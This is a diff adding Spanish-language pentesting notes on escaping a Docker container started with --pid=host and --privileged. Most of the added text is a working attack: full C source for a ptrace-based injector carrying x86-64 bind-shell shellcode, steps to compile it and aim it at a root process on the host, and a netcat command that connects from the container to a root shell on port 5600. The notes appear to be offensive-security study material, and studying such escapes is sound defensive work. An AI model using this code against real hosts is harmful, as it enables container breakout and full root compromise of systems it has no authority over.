@@ -70,3 +70,157 @@ estariamos modificando el binario bash del host real poniendole permisos de ejec
 otro caso
 
 contenedor con la flag --pid=host
+tambien con --privileged el cual habilita todas las capabilities
+
+si tienes acceso a listar las capabilities con capsh --print
+
+sino puedes instalarlo con apt install libcap2-bin
+
+suponiendo que sabes o descubriste lo de --pid=host y --privileged
+
+puedes listar los procesos
+
+ps -faux
+
+
+cuando tenemos este tipo de casos que por ejemplo tenga un contenedor con --pid=host si el host tiene un proceso corriendo con privilegios de root por ejemplo python -m http.server 80 lo vamos a poder ver y utilizar a nuestro favor, esto con cuaquier proceso que este corriendo como root
+
+la idea es poder inyectar shellcode instrucciones de bajo nivel maliciosas en el proceso que este corriendo como root, el cual permita crear un subproceso por el cual ejecute un comando
+
+podemos ver este repositorio
+https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
+
+especificamente este codigo infect.c
+
+en este caso el shellcode lo ajustamos para que nos permita entablar una [[Bind Shell]] dejando un puerto 5600 abierto y luego con [[netcat]] ponerneos en escucha y conectarnos a ese puerto
+
+existe en exploitdb un script que tiene ese shellcode. 
+
+```c
+ sh[]="\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";
+
+```
+lo ajustamos a nuestro codigo infect.c y nos quedaria asi
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+#include <sys/user.h>
+#include <sys/reg.h>
+
+#define SHELLCODE_SIZE 32
+
+unsigned char *shellcode =  "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";
+
+
+int
+inject_data (pid_t pid, unsigned char *src, void *dst, int len)
+{
+  int      i;
+  uint32_t *s = (uint32_t *) src;
+  uint32_t *d = (uint32_t *) dst;
+
+  for (i = 0; i < len; i+=4, s++, d++)
+    {
+      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
+	{
+	  perror ("ptrace(POKETEXT):");
+	  return -1;
+	}
+    }
+  return 0;
+}
+
+int
+main (int argc, char *argv[])
+{
+  pid_t                   target;
+  struct user_regs_struct regs;
+  int                     syscall;
+  long                    dst;
+
+  if (argc != 2)
+    {
+      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
+      exit (1);
+    }
+  target = atoi (argv[1]);
+  printf ("+ Tracing process %d\n", target);
+
+  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
+    {
+      perror ("ptrace(ATTACH):");
+      exit (1);
+    }
+
+  printf ("+ Waiting for process...\n");
+  wait (NULL);
+
+  printf ("+ Getting Registers\n");
+  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
+    {
+      perror ("ptrace(GETREGS):");
+      exit (1);
+    }
+  
+
+  /* Inject code into current RPI position */
+
+  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
+  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
+
+  regs.rip += 2;
+  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);
+
+  if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
+    {
+      perror ("ptrace(GETREGS):");
+      exit (1);
+    }
+  printf ("+ Run it!\n");
+
+ 
+  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
+	{
+	  perror ("ptrace(DETACH):");
+	  exit (1);
+	}
+  return 0;
+}
+```
+
+tener en cuenta que el contenedor necesitamos tener instalado gcc y libcap2-bin netcat nano
+
+con apt update && apt install gcc libcap2-bin netcat nano -y
+
+luego compilamos
+
+gcc infect.c -o infect
+
+y ejecutamos
+
+buscamos un proceso corriendo como root por ejemplo supongamos que un proceso python -m http.server 80 tiene el pid 1234
+
+./infect 1234
+
+luego ya estaria escuchando el host en el puerto 5600 pero primero
+
+la ip del contenedor -> hostname -I -> 172.17.0.2
+la ip del host -> por consecuencia seria 172.17.0.1
+
+en el contenedor obviamente
+
+nc 172.17.0.1 5600
+nos devuelve la consola interactiva
+
+
+ahi ya puedes hacer el [[Tratamiento de TTY]]
